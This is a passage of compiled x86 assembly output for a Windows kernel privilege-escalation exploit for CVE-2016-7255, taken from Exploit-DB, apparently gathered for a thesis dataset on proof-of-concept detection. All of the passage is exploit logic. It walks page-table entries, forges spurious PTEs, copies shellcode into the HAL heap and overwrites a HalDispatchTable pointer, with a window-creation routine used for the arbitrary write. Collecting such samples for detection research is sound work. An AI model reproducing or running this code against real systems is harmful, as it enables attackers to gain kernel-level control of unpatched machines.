	mov	DWORD PTR _HalDispatchTable$[ebp+4], ecx
; Line 625
	mov	edx, DWORD PTR _HalDispatchTable$[ebp]
	or	edx, DWORD PTR _HalDispatchTable$[ebp+4]
	jne	SHORT $LN7@GetHalDisp
; Line 626
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99419
	call	_printf
	add	esp, 8
; Line 627
	push	1
	call	_exit
; Line 628
	jmp	SHORT $LN8@GetHalDisp
$LN7@GetHalDisp:
; Line 630
	mov	eax, DWORD PTR _hKernelInUserMode$[ebp]
	cdq
	mov	ecx, DWORD PTR _HalDispatchTable$[ebp]
	sub	ecx, eax
	mov	eax, DWORD PTR _HalDispatchTable$[ebp+4]
	sbb	eax, edx
	mov	DWORD PTR _HalDispatchTable$[ebp], ecx
	mov	DWORD PTR _HalDispatchTable$[ebp+4], eax
; Line 633
	mov	eax, DWORD PTR _KernelBaseAddressInKernelMode$[ebp]
	cdq
	add	eax, DWORD PTR _HalDispatchTable$[ebp]
	adc	edx, DWORD PTR _HalDispatchTable$[ebp+4]
	mov	DWORD PTR _HalDispatchTable$[ebp], eax
	mov	DWORD PTR _HalDispatchTable$[ebp+4], edx
; Line 634
	mov	ecx, DWORD PTR _HalDispatchTable$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _HalDispatchTable$[ebp]
	push	edx
	push	OFFSET $SG99420
	call	_printf
	add	esp, 12					; 0000000cH
$LN8@GetHalDisp:
; Line 637
	mov	eax, DWORD PTR _pSystemModuleInformation$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapFree@12
; Line 639
	cmp	DWORD PTR _hNtDll$[ebp], 0
	je	SHORT $LN9@GetHalDisp
; Line 640
	mov	ecx, DWORD PTR _hNtDll$[ebp]
	push	ecx
	call	DWORD PTR __imp__FreeLibrary@4
$LN9@GetHalDisp:
; Line 643
	cmp	DWORD PTR _hKernelInUserMode$[ebp], 0
	je	SHORT $LN10@GetHalDisp
; Line 644
	mov	edx, DWORD PTR _hKernelInUserMode$[ebp]
	push	edx
	call	DWORD PTR __imp__FreeLibrary@4
$LN10@GetHalDisp:
; Line 647
	mov	DWORD PTR _hNtDll$[ebp], 0
; Line 648
	mov	DWORD PTR _hKernelInUserMode$[ebp], 0
; Line 649
	mov	DWORD PTR _pSystemModuleInformation$[ebp], 0
; Line 651
	mov	eax, DWORD PTR _HalDispatchTable$[ebp]
	mov	edx, DWORD PTR _HalDispatchTable$[ebp+4]
$LN11@GetHalDisp:
; Line 652
	mov	esp, ebp
	pop	ebp
	ret	0
_GetHalDispatchTable ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_hal_heap_addr$ = -16					; size = 8
_hal_heap$ = -8						; size = 8
_store_shellcode_in_hal PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 550
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
; Line 553
	or	eax, -1
	mov	DWORD PTR _hal_heap_addr$[ebp], -3145728 ; ffd00000H
	mov	DWORD PTR _hal_heap_addr$[ebp+4], eax
; Line 554
	push	1
	mov	ecx, DWORD PTR _hal_heap_addr$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _hal_heap_addr$[ebp]
	push	edx
	call	_create_spurious_pte_to_virtual_address
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _hal_heap$[ebp], eax
	mov	DWORD PTR _hal_heap$[ebp+4], edx
; Line 556
	mov	eax, DWORD PTR _hal_heap$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _hal_heap$[ebp]
	push	ecx
	push	OFFSET $SG99374
	call	_printf
	add	esp, 12					; 0000000cH
; Line 560
	push	103					; 00000067H
	push	OFFSET _shellcode
	mov	edx, DWORD PTR _hal_heap$[ebp]
	add	edx, 3408				; 00000d50H
	push	edx
	call	_memcpy
	add	esp, 12					; 0000000cH
; Line 561
	mov	eax, -3142320				; ffd00d50H
	or	edx, -1
; Line 562
	mov	esp, ebp
	pop	ebp
	ret	0
_store_shellcode_in_hal ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_target$ = -16						; size = 8
_OverwriteTarget$ = -8					; size = 8
_hook_address$ = 8					; size = 8
_target_address$ = 16					; size = 8
_target_offset$ = 24					; size = 4
_overwrite_TargetAddress PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 541
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
	push	esi
; Line 542
	push	0
	mov	eax, DWORD PTR _target_address$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _target_address$[ebp]
	push	ecx
	call	_create_spurious_pte_to_virtual_address
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _OverwriteTarget$[ebp], eax
	mov	DWORD PTR _OverwriteTarget$[ebp+4], edx
; Line 543
	mov	edx, DWORD PTR _target_address$[ebp]
	and	edx, 4095				; 00000fffH
	mov	eax, DWORD PTR _target_address$[ebp+4]
	and	eax, 0
	add	edx, DWORD PTR _OverwriteTarget$[ebp]
	adc	eax, DWORD PTR _OverwriteTarget$[ebp+4]
	mov	DWORD PTR _OverwriteTarget$[ebp], edx
	mov	DWORD PTR _OverwriteTarget$[ebp+4], eax
; Line 544
	mov	eax, DWORD PTR _OverwriteTarget$[ebp]
	cdq
	mov	ecx, eax
	mov	esi, edx
	mov	eax, DWORD PTR _target_offset$[ebp]
	cdq
	add	ecx, eax
	adc	esi, edx
	mov	DWORD PTR _target$[ebp], ecx
	mov	DWORD PTR _target$[ebp+4], esi
; Line 545
	mov	edx, DWORD PTR _hook_address$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _hook_address$[ebp]
	push	eax
	mov	ecx, DWORD PTR _target$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _target$[ebp]
	push	edx
	push	OFFSET $SG99367
	call	_printf
	add	esp, 20					; 00000014H
; Line 546
	mov	eax, DWORD PTR _hook_address$[ebp]
	mov	ecx, DWORD PTR _target$[ebp]
	mov	DWORD PTR [ecx], eax
; Line 547
	pop	esi
	mov	esp, ebp
	pop	ebp
	ret	0
_overwrite_TargetAddress ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_OverwriteAddress$ = -8					; size = 8
_target_address$ = 8					; size = 8
_target_offset$ = 16					; size = 4
_get_OverwriteAddress_pointer PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 533
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 534
	mov	eax, DWORD PTR _target_address$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _target_address$[ebp]
	push	ecx
	push	OFFSET $SG99351
	call	_printf
	add	esp, 12					; 0000000cH
; Line 535
	push	0
	mov	edx, DWORD PTR _target_address$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _target_address$[ebp]
	push	eax
	call	_create_spurious_pte_to_virtual_address
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _OverwriteAddress$[ebp], eax
	mov	DWORD PTR _OverwriteAddress$[ebp+4], edx
; Line 536
	mov	ecx, DWORD PTR _target_address$[ebp]
	and	ecx, 4095				; 00000fffH
	mov	edx, DWORD PTR _target_address$[ebp+4]
	and	edx, 0
	add	ecx, DWORD PTR _OverwriteAddress$[ebp]
	adc	edx, DWORD PTR _OverwriteAddress$[ebp+4]
	mov	DWORD PTR _OverwriteAddress$[ebp], ecx
	mov	DWORD PTR _OverwriteAddress$[ebp+4], edx
; Line 537
	mov	eax, DWORD PTR _OverwriteAddress$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _OverwriteAddress$[ebp]
	push	ecx
	push	OFFSET $SG99352
	call	_printf
	add	esp, 12					; 0000000cH
; Line 538
	mov	edx, DWORD PTR _OverwriteAddress$[ebp]
	mov	eax, DWORD PTR _target_offset$[ebp]
	mov	eax, DWORD PTR [edx+eax]
	cdq
; Line 539
	mov	esp, ebp
	pop	ebp
	ret	0
_get_OverwriteAddress_pointer ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_pte_addr$ = -120					; size = 8
_pde_addr$ = -112					; size = 8
_f_e_pml4$ = -104					; size = 8
_pml4e$ = -96						; size = 8
_pte$ = -88						; size = 8
_pde$ = -80						; size = 8
_pdpte$ = -72						; size = 8
_pde_pfn$ = -64						; size = 8
_pdpte_pfn$ = -56					; size = 8
_pml4e_pfn$ = -48					; size = 8
_spurious_pt$ = -40					; size = 8
_pte_pfn$ = -32						; size = 8
_spurious_offset$ = -24					; size = 8
_pml4e_offset$ = -16					; size = 4
_pdpte_offset$ = -12					; size = 4
_pde_offset$ = -8					; size = 4
_pte_offset$ = -4					; size = 4
_virtual_address$ = 8					; size = 8
_patch_original$ = 16					; size = 4
_create_spurious_pte_to_virtual_address PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 451
	push	ebp
	mov	ebp, esp
	sub	esp, 120				; 00000078H
; Line 461
	mov	eax, DWORD PTR _virtual_address$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _virtual_address$[ebp]
	push	ecx
	call	_get_pxe_address
	add	esp, 8
	mov	DWORD PTR _pte$[ebp], eax
	mov	DWORD PTR _pte$[ebp+4], edx
; Line 462
	mov	edx, DWORD PTR _pte$[ebp]
	and	edx, 4095				; 00000fffH
	mov	DWORD PTR _pte_offset$[ebp], edx
; Line 465
	mov	eax, DWORD PTR _pte$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pte$[ebp]
	push	ecx
	call	_get_pxe_address
	add	esp, 8
	mov	DWORD PTR _pde$[ebp], eax
	mov	DWORD PTR _pde$[ebp+4], edx
; Line 466
	mov	edx, DWORD PTR _pde$[ebp]
	and	edx, 4095				; 00000fffH
	mov	DWORD PTR _pde_offset$[ebp], edx
; Line 469
	mov	eax, DWORD PTR _pde$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pde$[ebp]
	push	ecx
	call	_get_pxe_address
	add	esp, 8
	mov	DWORD PTR _pdpte$[ebp], eax
	mov	DWORD PTR _pdpte$[ebp+4], edx
; Line 470
	mov	edx, DWORD PTR _pdpte$[ebp]
	and	edx, 4095				; 00000fffH
	mov	DWORD PTR _pdpte_offset$[ebp], edx
; Line 473
	mov	eax, DWORD PTR _pdpte$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pdpte$[ebp]
	push	ecx
	call	_get_pxe_address
	add	esp, 8
	mov	DWORD PTR _pml4e$[ebp], eax
	mov	DWORD PTR _pml4e$[ebp+4], edx
; Line 474
	mov	edx, DWORD PTR _pml4e$[ebp]
	and	edx, 4095				; 00000fffH
	mov	DWORD PTR _pml4e_offset$[ebp], edx
; Line 477
	call	_look_free_entry_pml4
	mov	DWORD PTR _spurious_offset$[ebp], eax
	mov	DWORD PTR _spurious_offset$[ebp+4], edx
; Line 478
	mov	eax, DWORD PTR _spurious_offset$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _spurious_offset$[ebp]
	push	ecx
	push	OFFSET $SG99327
	call	_printf
	add	esp, 12					; 0000000cH
; Line 479
	mov	edx, DWORD PTR _spurious_offset$[ebp]
	mov	eax, DWORD PTR _spurious_offset$[ebp+4]
	mov	DWORD PTR _f_e_pml4$[ebp], edx
	mov	DWORD PTR _f_e_pml4$[ebp+4], eax
; Line 480
	mov	ecx, DWORD PTR _spurious_offset$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _spurious_offset$[ebp]
	push	edx
	call	_calculate_spurious_pt_address
	add	esp, 8
	mov	DWORD PTR _spurious_pt$[ebp], eax
	mov	DWORD PTR _spurious_pt$[ebp+4], edx
; Line 481
	mov	eax, DWORD PTR _spurious_pt$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _spurious_pt$[ebp]
	push	ecx
	push	OFFSET $SG99328
	call	_printf
	add	esp, 12					; 0000000cH
; Line 482
	push	OFFSET $SG99329
	call	_printf
	add	esp, 4
; Line 486
	mov	edx, DWORD PTR _pml4e$[ebp]
	mov	eax, DWORD PTR [edx]
	cdq
	mov	DWORD PTR _pml4e_pfn$[ebp], eax
	mov	DWORD PTR _pml4e_pfn$[ebp+4], edx
; Line 487
	mov	eax, DWORD PTR _pml4e_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pml4e_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _pml4e$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _pml4e$[ebp]
	push	eax
	push	OFFSET $SG99330
	call	_printf
	add	esp, 20					; 00000014H
; Line 489
	mov	ecx, DWORD PTR _pml4e_pfn$[ebp]
	or	ecx, 103				; 00000067H
	mov	edx, DWORD PTR _pml4e_pfn$[ebp+4]
	mov	DWORD PTR _pml4e_pfn$[ebp], ecx
	mov	DWORD PTR _pml4e_pfn$[ebp+4], edx
; Line 491
	mov	eax, DWORD PTR _pml4e_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pml4e_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _f_e_pml4$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _f_e_pml4$[ebp]
	push	eax
	push	OFFSET $SG99331
	call	_printf
	add	esp, 20					; 00000014H
; Line 492
	mov	ecx, DWORD PTR _pml4e_pfn$[ebp]
	mov	edx, DWORD PTR _spurious_offset$[ebp]
	mov	DWORD PTR [edx], ecx
; Line 493
	push	1
	call	DWORD PTR __imp__Sleep@4
; Line 496
	mov	eax, DWORD PTR _pdpte_offset$[ebp]
	cdq
	add	eax, DWORD PTR _spurious_pt$[ebp]
	mov	eax, DWORD PTR [eax]
	cdq
	mov	DWORD PTR _pdpte_pfn$[ebp], eax
	mov	DWORD PTR _pdpte_pfn$[ebp+4], edx
; Line 497
	mov	eax, DWORD PTR _pdpte_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pdpte_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _pdpte$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _pdpte$[ebp]
	push	eax
	push	OFFSET $SG99332
	call	_printf
	add	esp, 20					; 00000014H
; Line 499
	mov	ecx, DWORD PTR _pdpte_pfn$[ebp]
	or	ecx, 103				; 00000067H
	mov	edx, DWORD PTR _pdpte_pfn$[ebp+4]
	mov	DWORD PTR _pdpte_pfn$[ebp], ecx
	mov	DWORD PTR _pdpte_pfn$[ebp+4], edx
; Line 500
	mov	eax, DWORD PTR _pdpte_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pdpte_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _spurious_offset$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _spurious_offset$[ebp]
	push	eax
	push	OFFSET $SG99333
	call	_printf
	add	esp, 20					; 00000014H
; Line 501
	mov	ecx, DWORD PTR _pdpte_pfn$[ebp]
	mov	edx, DWORD PTR _spurious_offset$[ebp]
	mov	DWORD PTR [edx], ecx
; Line 502
	push	1
	call	DWORD PTR __imp__Sleep@4
; Line 505
	mov	eax, DWORD PTR _pde_offset$[ebp]
	cdq
	add	eax, DWORD PTR _spurious_pt$[ebp]
	adc	edx, DWORD PTR _spurious_pt$[ebp+4]
	mov	DWORD PTR _pde_addr$[ebp], eax
	mov	DWORD PTR _pde_addr$[ebp+4], edx
; Line 506
	mov	eax, DWORD PTR _pde_offset$[ebp]
	cdq
	add	eax, DWORD PTR _spurious_pt$[ebp]
	mov	eax, DWORD PTR [eax]
	cdq
	mov	DWORD PTR _pde_pfn$[ebp], eax
	mov	DWORD PTR _pde_pfn$[ebp+4], edx
; Line 507
	mov	eax, DWORD PTR _pde_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pde_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _pde$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _pde$[ebp]
	push	eax
	push	OFFSET $SG99334
	call	_printf
	add	esp, 20					; 00000014H
; Line 509
	mov	ecx, DWORD PTR _pde_pfn$[ebp]
	or	ecx, 103				; 00000067H
	mov	edx, DWORD PTR _pde_pfn$[ebp+4]
	mov	DWORD PTR _pde_pfn$[ebp], ecx
	mov	DWORD PTR _pde_pfn$[ebp+4], edx
; Line 510
	mov	eax, DWORD PTR _pde_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pde_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _spurious_offset$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _spurious_offset$[ebp]
	push	eax
	push	OFFSET $SG99335
	call	_printf
	add	esp, 20					; 00000014H
; Line 511
	mov	ecx, DWORD PTR _pde_pfn$[ebp]
	mov	edx, DWORD PTR _spurious_offset$[ebp]
	mov	DWORD PTR [edx], ecx
; Line 512
	push	1
	call	DWORD PTR __imp__Sleep@4
; Line 515
	mov	eax, DWORD PTR _pte_offset$[ebp]
	cdq
	add	eax, DWORD PTR _spurious_pt$[ebp]
	adc	edx, DWORD PTR _spurious_pt$[ebp+4]
	mov	DWORD PTR _pte_addr$[ebp], eax
	mov	DWORD PTR _pte_addr$[ebp+4], edx
; Line 516
	mov	eax, DWORD PTR _pte_offset$[ebp]
	cdq
	add	eax, DWORD PTR _spurious_pt$[ebp]
	mov	eax, DWORD PTR [eax]
	cdq
	mov	DWORD PTR _pte_pfn$[ebp], eax
	mov	DWORD PTR _pte_pfn$[ebp+4], edx
; Line 517
	mov	eax, DWORD PTR _pte_pfn$[ebp+4]
	push	eax
	mov	ecx, DWORD PTR _pte_pfn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _pte$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _pte$[ebp]
	push	eax
	push	OFFSET $SG99336
	call	_printf
	add	esp, 20					; 00000014H
; Line 519
	mov	ecx, DWORD PTR _pte_pfn$[ebp]
	or	ecx, 103				; 00000067H
	mov	edx, DWORD PTR _pte_pfn$[ebp+4]
	mov	DWORD PTR _pte_pfn$[ebp], ecx
	mov	DWORD PTR _pte_pfn$[ebp+4], edx
; Line 520
	mov	eax, DWORD PTR _pte_pfn$[ebp]
	mov	ecx, DWORD PTR _pte_pfn$[ebp+4]
	and	ecx, 2147483647				; 7fffffffH
	mov	DWORD PTR _pte_pfn$[ebp], eax
	mov	DWORD PTR _pte_pfn$[ebp+4], ecx
; Line 521
	cmp	DWORD PTR _patch_original$[ebp], 0
	je	SHORT $LN2@create_spu
; Line 522
	push	OFFSET $SG99338
	call	_printf
	add	esp, 4
; Line 523
	mov	ecx, DWORD PTR _pte_pfn$[ebp]
	mov	eax, DWORD PTR _pte_offset$[ebp]
	cdq
	add	eax, DWORD PTR _spurious_pt$[ebp]
	mov	DWORD PTR [eax], ecx
$LN2@create_spu:
; Line 526
	mov	edx, DWORD PTR _pte_pfn$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _pte_pfn$[ebp]
	push	eax
	mov	ecx, DWORD PTR _spurious_offset$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _spurious_offset$[ebp]
	push	edx
	push	OFFSET $SG99339
	call	_printf
	add	esp, 20					; 00000014H
; Line 527
	mov	eax, DWORD PTR _pte_pfn$[ebp]
	mov	ecx, DWORD PTR _spurious_offset$[ebp]
	mov	DWORD PTR [ecx], eax
; Line 528
	push	1
	call	DWORD PTR __imp__Sleep@4
; Line 529
	push	OFFSET $SG99340
	call	_printf
	add	esp, 4
; Line 530
	mov	eax, DWORD PTR _spurious_pt$[ebp]
	mov	edx, DWORD PTR _spurious_pt$[ebp+4]
; Line 531
	mov	esp, ebp
	pop	ebp
	ret	0
_create_spurious_pte_to_virtual_address ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_result$ = -16						; size = 8
_index$ = -8						; size = 8
_spurious_offset$ = 8					; size = 8
_calculate_spurious_pt_address PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 437
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
	push	esi
	push	edi
; Line 438
	mov	eax, DWORD PTR _spurious_offset$[ebp]
	and	eax, 4095				; 00000fffH
	mov	ecx, DWORD PTR _spurious_offset$[ebp+4]
	and	ecx, 0
	push	0
	push	8
	push	ecx
	push	eax
	call	__aulldiv
	mov	DWORD PTR _index$[ebp], eax
	mov	DWORD PTR _index$[ebp+4], edx
; Line 439
	xor	edx, edx
	mov	eax, DWORD PTR _PML4_SELF_REF_INDEX
	mov	cl, 39					; 00000027H
	call	__allshl
	mov	esi, eax
	mov	edi, edx
	or	edi, -65536				; ffff0000H
	xor	edx, edx
	mov	eax, DWORD PTR _PML4_SELF_REF_INDEX
	mov	cl, 30					; 0000001eH
	call	__allshl
	or	esi, eax
	or	edi, edx
	xor	edx, edx
	mov	eax, DWORD PTR _PML4_SELF_REF_INDEX
	mov	cl, 21					; 00000015H
	call	__allshl
	or	esi, eax
	or	edi, edx
	mov	eax, DWORD PTR _index$[ebp]
	mov	edx, DWORD PTR _index$[ebp+4]
	mov	cl, 12					; 0000000cH
	call	__allshl
	or	esi, eax
	or	edi, edx
	mov	DWORD PTR _result$[ebp], esi
	mov	DWORD PTR _result$[ebp+4], edi
; Line 446
	mov	eax, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR _result$[ebp+4]
; Line 447
	pop	edi
	pop	esi
	mov	esp, ebp
	pop	ebp
	ret	0
_calculate_spurious_pt_address ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_pml4_search$ = -12					; size = 8
_offset$ = -4						; size = 4
_look_free_entry_pml4 PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 420
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 422
	mov	DWORD PTR _offset$[ebp], 3840		; 00000f00H
; Line 423
	mov	eax, DWORD PTR _offset$[ebp]
	cdq
	add	eax, DWORD PTR _PML4_BASE
	adc	edx, DWORD PTR _PML4_BASE+4
	mov	DWORD PTR _pml4_search$[ebp], eax
	mov	DWORD PTR _pml4_search$[ebp+4], edx
$LN2@look_free_:
; Line 424
	cmp	DWORD PTR _offset$[ebp], 4088		; 00000ff8H
	jge	SHORT $LN3@look_free_
; Line 426
	mov	eax, DWORD PTR _pml4_search$[ebp]
	cmp	DWORD PTR [eax], 0
	jne	SHORT $LN4@look_free_
; Line 429
	jmp	SHORT $LN3@look_free_
$LN4@look_free_:
; Line 431
	mov	ecx, DWORD PTR _offset$[ebp]
	add	ecx, 8
	mov	DWORD PTR _offset$[ebp], ecx
; Line 432
	mov	eax, DWORD PTR _offset$[ebp]
	cdq
	add	eax, DWORD PTR _PML4_BASE
	adc	edx, DWORD PTR _PML4_BASE+4
	mov	DWORD PTR _pml4_search$[ebp], eax
	mov	DWORD PTR _pml4_search$[ebp+4], edx
; Line 433
	jmp	SHORT $LN2@look_free_
$LN3@look_free_:
; Line 434
	mov	eax, DWORD PTR _pml4_search$[ebp]
	mov	edx, DWORD PTR _pml4_search$[ebp+4]
; Line 435
	mov	esp, ebp
	pop	ebp
	ret	0
_look_free_entry_pml4 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_upper_boundary$ = -28					; size = 8
_lower_boundary$ = -20					; size = 8
_result$ = -12						; size = 8
_entry$ = -4						; size = 4
_address$ = 8						; size = 8
_get_pxe_address PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 410
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 411
	mov	eax, DWORD PTR _PML4_SELF_REF_INDEX
	mov	DWORD PTR _entry$[ebp], eax
; Line 412
	mov	eax, DWORD PTR _address$[ebp]
	mov	edx, DWORD PTR _address$[ebp+4]
	mov	cl, 9
	call	__aullshr
	mov	DWORD PTR _result$[ebp], eax
	mov	DWORD PTR _result$[ebp+4], edx
; Line 413
	xor	edx, edx
	mov	eax, DWORD PTR _entry$[ebp]
	mov	cl, 39					; 00000027H
	call	__allshl
	or	edx, -65536				; ffff0000H
	mov	DWORD PTR _lower_boundary$[ebp], eax
	mov	DWORD PTR _lower_boundary$[ebp+4], edx
; Line 414
	xor	edx, edx
	mov	eax, DWORD PTR _entry$[ebp]
	mov	cl, 39					; 00000027H
	call	__allshl
	add	eax, 0
	adc	edx, 128				; 00000080H
	sub	eax, 1
	sbb	edx, 0
	or	edx, -65536				; ffff0000H
	and	eax, -8					; fffffff8H
	mov	DWORD PTR _upper_boundary$[ebp], eax
	mov	DWORD PTR _upper_boundary$[ebp+4], edx
; Line 415
	mov	ecx, DWORD PTR _result$[ebp]
	or	ecx, DWORD PTR _lower_boundary$[ebp]
	mov	edx, DWORD PTR _result$[ebp+4]
	or	edx, DWORD PTR _lower_boundary$[ebp+4]
	mov	DWORD PTR _result$[ebp], ecx
	mov	DWORD PTR _result$[ebp+4], edx
; Line 416
	mov	eax, DWORD PTR _result$[ebp]
	and	eax, DWORD PTR _upper_boundary$[ebp]
	mov	ecx, DWORD PTR _result$[ebp+4]
	and	ecx, DWORD PTR _upper_boundary$[ebp+4]
	mov	DWORD PTR _result$[ebp], eax
	mov	DWORD PTR _result$[ebp+4], ecx
; Line 417
	mov	eax, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR _result$[ebp+4]
; Line 418
	mov	esp, ebp
	pop	ebp
	ret	0
_get_pxe_address ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stWC$ = -136						; size = 48
_stMsg$ = -88						; size = 28
tv230 = -60						; size = 8
_value$ = -52						; size = 8
_pszTitleName$ = -44					; size = 4
_pId$ = -40						; size = 4
_pszClassName$ = -36					; size = 4
_hWndParent$ = -32					; size = 4
_hWndChild$ = -28					; size = 4
__$SEHRec$ = -24					; size = 24
_pAddress$ = 8						; size = 4
_or_address_value_4 PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 274
	push	ebp
	mov	ebp, esp
	push	-2					; fffffffeH
	push	OFFSET __sehtable$_or_address_value_4
	push	OFFSET __except_handler4
	mov	eax, DWORD PTR fs:0
	push	eax
	add	esp, -120				; ffffff88H
	push	ebx
	push	esi
	push	edi
	mov	eax, DWORD PTR ___security_cookie
	xor	DWORD PTR __$SEHRec$[ebp+16], eax
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$SEHRec$[ebp+8]
	mov	DWORD PTR fs:0, eax
	mov	DWORD PTR __$SEHRec$[ebp], esp
; Line 275
	push	48					; 00000030H
	push	0
	lea	eax, DWORD PTR _stWC$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 277
	mov	DWORD PTR _hWndParent$[ebp], 0
; Line 278
	mov	DWORD PTR _hWndChild$[ebp], 0
; Line 280
	mov	DWORD PTR _pszClassName$[ebp], OFFSET $SG99243
; Line 281
	mov	DWORD PTR _pszTitleName$[ebp], OFFSET $SG99244
; Line 283
	mov	DWORD PTR _pId$[ebp], 0
; Line 284
	xor	ecx, ecx
	mov	DWORD PTR _stMsg$[ebp], ecx
	mov	DWORD PTR _stMsg$[ebp+4], ecx
	mov	DWORD PTR _stMsg$[ebp+8], ecx
	mov	DWORD PTR _stMsg$[ebp+12], ecx
	mov	DWORD PTR _stMsg$[ebp+16], ecx
	mov	DWORD PTR _stMsg$[ebp+20], ecx
	mov	DWORD PTR _stMsg$[ebp+24], ecx
; Line 286
	xorps	xmm0, xmm0
	movlpd	QWORD PTR _value$[ebp], xmm0
$LN4@or_address:
; Line 291
	mov	DWORD PTR _stWC$[ebp], 48		; 00000030H
; Line 292
	mov	edx, DWORD PTR __imp__DefWindowProcW@16
	mov	DWORD PTR _stWC$[ebp+8], edx
; Line 293
	mov	eax, DWORD PTR _pszClassName$[ebp]
	mov	DWORD PTR _stWC$[ebp+40], eax
; Line 295
	lea	ecx, DWORD PTR _stWC$[ebp]
	push	ecx
	call	DWORD PTR __imp__RegisterClassExW@4
	movzx	edx, ax
	test	edx, edx
	jne	SHORT $LN7@or_address
; Line 297
	jmp	$LN3@or_address
$LN7@or_address:
; Line 300
	push	0
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	push	0
	push	0
	push	360					; 00000168H
	push	360					; 00000168H
	push	0
	push	0
	push	282001408				; 10cf0000H
	push	0
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__CreateWindowExW@48
	mov	DWORD PTR _hWndParent$[ebp], eax
; Line 315
	cmp	DWORD PTR _hWndParent$[ebp], 0
	jne	SHORT $LN8@or_address
; Line 317
	jmp	$LN3@or_address
$LN8@or_address:
; Line 320
	push	0
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	push	0
